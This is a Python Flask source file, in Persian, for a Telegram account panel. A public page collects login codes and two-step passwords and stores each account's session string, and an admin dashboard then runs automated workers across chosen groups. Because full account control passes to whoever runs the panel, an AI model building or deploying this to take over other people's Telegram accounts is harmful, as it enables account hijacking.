import os
import re
import asyncio
import threading

from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    flash,
    session
)

from config import SECRET_KEY, PANEL_PASSWORD
from database import (
    init_db,
    get_user,
    get_all_users,
    save_user,
    delete_user
)

from clients import (
    send_code,
    sign_in,
    check_password,
    get_groups
)

import workers


# ------------------------------------------------------------------
# Background asyncio loop for Pyrogram
# ------------------------------------------------------------------

LOOP = asyncio.new_event_loop()


def _run_loop():
    asyncio.set_event_loop(LOOP)
    LOOP.run_forever()


threading.Thread(target=_run_loop, daemon=True).start()


def run_async(coro, timeout=None):
    future = asyncio.run_coroutine_threadsafe(coro, LOOP)
    return future.result(timeout=timeout)


def safe_run_async(coro, timeout=None):
    try:
        return run_async(coro, timeout=timeout)
    except Exception as e:
        return f"error: {str(e)}"


def is_error_result(result):
    return isinstance(result, str) and (
        result.startswith("error:")
        or result.startswith("خطا")
    )


def is_session_string(result):
    return (
        isinstance(result, str)
        and not is_error_result(result)
        and len(result) > 100
    )


# ------------------------------------------------------------------
# Flask app
# ------------------------------------------------------------------

app = Flask(__name__)
app.secret_key = SECRET_KEY

init_db()


# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------

FA_DIGITS = str.maketrans("۰۱۲۳۴۵۶۷۸۹", "0123456789")


def normalize_group_id(value: str):
    value = str(value or "").strip().translate(FA_DIGITS)
    value = re.sub(r"[^0-9-]", "", value)

    match = re.fullmatch(r"-?\d+", value)

    if match:
        return match.group(0)

    return None


# ------------------------------------------------------------------
# Login routes
# ------------------------------------------------------------------

@app.route("/")
def index():
    return render_template("login.html")


@app.route("/send_code", methods=["POST"])
def send_code_route():
    phone = request.form.get("phone", "").strip()

    if not phone:
        flash("شماره را وارد کنید", "danger")
        return redirect(url_for("index"))

    result = safe_run_async(send_code(phone), timeout=60)

    if result is True:
        session["phone"] = phone
        return render_template("code.html", phone=phone)

    flash(str(result), "danger")
    return redirect(url_for("index"))


@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = session.get("phone")
    code = request.form.get("code", "").strip()

    if not phone:
        flash("نشست منقضی شده، دوباره شماره وارد کنید", "danger")
        return redirect(url_for("index"))

    result = safe_run_async(sign_in(phone, code), timeout=60)

    if result == "need_password":
        return render_template("password.html", phone=phone)

    if is_session_string(result):
        groups = safe_run_async(get_groups(result), timeout=60)

        if not isinstance(groups, list):
            groups = []

        save_user(
            phone=phone,
            session_string=result,
            selected_groups=[],
            meow_enabled=False,
            fish_enabled=False,
            is_active=False,
            cached_groups=groups
        )

        session.pop("phone", None)

        flash("اکانت با موفقیت اضافه شد", "success")
        return redirect(url_for("admin"))

    flash(str(result), "danger")
    return redirect(url_for("index"))


@app.route("/verify_password", methods=["POST"])
def verify_password():
    phone = session.get("phone")
    password = request.form.get("password", "").strip()

    if not phone:
        return redirect(url_for("index"))

    result = safe_run_async(check_password(password), timeout=60)

    if is_session_string(result):
        groups = safe_run_async(get_groups(result), timeout=60)

        if not isinstance(groups, list):
            groups = []

        save_user(
            phone=phone,
            session_string=result,
            selected_groups=[],
            meow_enabled=False,
            fish_enabled=False,
            is_active=False,
            cached_groups=groups
        )

        session.pop("phone", None)

        flash("اکانت با موفقیت اضافه شد", "success")
        return redirect(url_for("admin"))

    flash(str(result), "danger")
    return redirect(url_for("index"))


# ------------------------------------------------------------------
# Admin panel
# ------------------------------------------------------------------

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        password = request.form.get("password", "")

        if password == PANEL_PASSWORD:
            session["is_admin"] = True

            try:
                workers.start_all_active(LOOP)
            except Exception as e:
                print(f"start_all_active error: {e}")

            return redirect(url_for("dashboard"))

        flash("رمز اشتباه است", "danger")

    if session.get("is_admin"):
        return redirect(url_for("dashboard"))

    return render_template("admin_login.html")


@app.route("/dashboard")
def dashboard():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    managed = session.get("managed_phone")
    all_users = get_all_users()

    if not managed and all_users:
        managed = all_users[0]["phone"]
        session["managed_phone"] = managed

    user = get_user(managed) if managed else None

    if not user and all_users:
        managed = all_users[0]["phone"]
        session["managed_phone"] = managed
        user = get_user(managed)

    groups = user.get("cached_groups", []) if user else []

    return render_template(
        "dashboard.html",
        managed_phone=managed,
        user=user,
        groups=groups,
        all_users=all_users
    )


@app.route("/switch/<phone>")
def switch_user(phone):
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    if get_user(phone):
        session["managed_phone"] = phone

    return redirect(url_for("dashboard"))


# ------------------------------------------------------------------
# Save settings
# ------------------------------------------------------------------

@app.route("/save", methods=["POST"], strict_slashes=False)
def save_settings():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    phone = session.get("managed_phone")
    user = get_user(phone)

    if not user:
        return redirect(url_for("dashboard"))

    selected_raw = request.form.getlist("groups")

    manual_id = request.form.get("manual_group_id", "").strip()
    if manual_id:
        selected_raw.append(manual_id)

    selected = []

    for gid in selected_raw:
        normalized = normalize_group_id(gid)

        if normalized and normalized not in selected:
            selected.append(normalized)

    meow = request.form.get("meow_enabled") == "on"

    # Compatible with both new "pishi_enabled" and old "fish_enabled"
    pishi = (
        request.form.get("pishi_enabled") == "on"
        or request.form.get("fish_enabled") == "on"
    )

    active = request.form.get("is_active") == "on"

    save_user(
        phone=phone,
        session_string=user["session_string"],
        selected_groups=selected,
        meow_enabled=meow,
        fish_enabled=pishi,
        is_active=active,
        cached_groups=user.get("cached_groups")
    )

    if active:
        workers.start_worker(phone, LOOP)
    else:
        workers.stop_worker(phone, LOOP)

    flash("تنظیمات با موفقیت ذخیره شد", "success")
    return redirect(url_for("dashboard"))


# ------------------------------------------------------------------
# Refresh groups
# ------------------------------------------------------------------

@app.route("/refresh_groups", methods=["POST"])
def refresh_groups():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    phone = session.get("managed_phone")
    user = get_user(phone)

    if not user:
        return redirect(url_for("dashboard"))

    groups = safe_run_async(get_groups(user["session_string"]), timeout=90)

    if isinstance(groups, list):
        save_user(
            phone=phone,
            session_string=user["session_string"],
            selected_groups=user.get("selected_groups"),
            meow_enabled=user.get("meow_enabled"),
            fish_enabled=user.get("fish_enabled"),
            is_active=user.get("is_active"),
            cached_groups=groups
        )

        flash(f"{len(groups)} گروه دریافت شد", "success")

    else:
        flash(f"خطا در دریافت گروه‌ها: {groups}", "danger")

    return redirect(url_for("dashboard"))


# ------------------------------------------------------------------
# Remove account
# ------------------------------------------------------------------

@app.route("/remove", methods=["POST"])
def remove_user():
    if not session.get("is_admin"):
        return redirect(url_for("admin"))

    phone = request.form.get("phone")

    if phone:
        workers.stop_worker(phone, LOOP)
        delete_user(phone)

        if session.get("managed_phone") == phone:
            session["managed_phone"] = None

        flash("اکانت حذف شد", "success")

    return redirect(url_for("dashboard"))


# ------------------------------------------------------------------
# Startup
# ------------------------------------------------------------------

try:
    workers.start_all_active(LOOP)
except Exception as e:
    print(f"Startup worker error: {e}")


if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port)